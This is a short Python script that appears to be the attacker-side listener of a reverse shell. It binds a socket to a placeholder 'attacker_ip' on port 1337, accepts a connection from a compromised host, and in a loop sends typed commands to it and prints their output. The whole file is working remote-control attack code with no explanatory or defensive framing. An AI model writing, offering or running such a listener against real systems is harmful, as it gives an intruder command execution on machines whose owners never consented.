import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit")
		connection.close()
		break
		
	connection.send(bytes(cmd, "utf-8")) 
	
	output = connection.recv(2048)
	print(output.decode("utf-8"))

print("Server has stopped")
